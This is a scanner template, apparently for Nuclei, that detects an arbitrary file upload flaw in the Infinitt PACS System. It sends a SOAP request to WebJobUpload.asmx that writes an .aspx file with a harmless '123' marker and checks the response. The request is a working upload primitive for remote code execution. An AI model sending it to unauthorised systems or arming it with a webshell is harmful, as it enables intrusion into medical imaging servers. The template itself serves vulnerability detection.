id: infinitt-pacs-file-upload
brief:
    title: Infinitt PACS System - Arbitary File Upload
    by: adeljck
    level: critical
    about: Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.
    label:
        - infinitt
        - file-upload
        - intrusive
        - rce
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/webservices/WebJobUpload.asmx'
      head:
        Content-Type: text/xml; charset=utf-8
        Soapaction: '"http://rainier/jobUpload"'
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <jobUpload xmlns="http://rainier">
        <vcode>1</vcode>
        <subFolder></subFolder>
        <fileName>{{filename}}.aspx</fileName>
        <bufValue>MTIz</bufValue>
        </jobUpload>
        </soap:Body>
        </soap:Envelope>
      signs:
        - "on": word
          has:
            - <jobUploadResult>
          in: body
          need: all
        - "on": word
          has:
            - text/xml
          in: content_type
          need: all
        - "on": status
          status:
            - 200
